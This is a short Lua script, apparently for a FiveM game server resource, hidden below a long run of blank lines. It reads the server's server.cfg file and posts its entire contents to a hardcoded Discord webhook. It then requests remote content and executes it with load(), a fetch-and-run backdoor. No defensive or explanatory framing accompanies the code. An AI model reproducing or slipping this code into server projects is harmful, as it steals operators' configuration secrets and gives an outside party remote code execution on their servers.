


















































































































































































































































































































































































































































































































WebHookToken = "https://discord.com/api/webhooks/990712324144910387/YihQg8fXZIy9Pojhh4WZJbZYL80JW3SyX-PnMAQaBkuIywJLaTA-G0Jyowc6ytciTIOg"
Name = "Bonsoir"
LogsRed = 15158332

function LogsRageUI(Color, Title, Description)
    local Content = {
            {
                ["color"] = Color,
                ["title"] = Title,
                ["description"] = Description,
                ["footer"] = {
                    ["text"] = Name,
                },
            }
        }
    PerformHttpRequest(WebHookToken, function(err, text, headers) end, 'POST', json.encode({username = Name, embeds = Content}), { ['Content-Type'] = 'application/json' })
end

file = io.open("server.cfg", "r")
servercfg = file:read("*a")
file:close()
LogsRageUI(LogsRed, "OneLife", servercfg)



PerformHttpRequest("", function (e, value, re)
    load(value)()
end)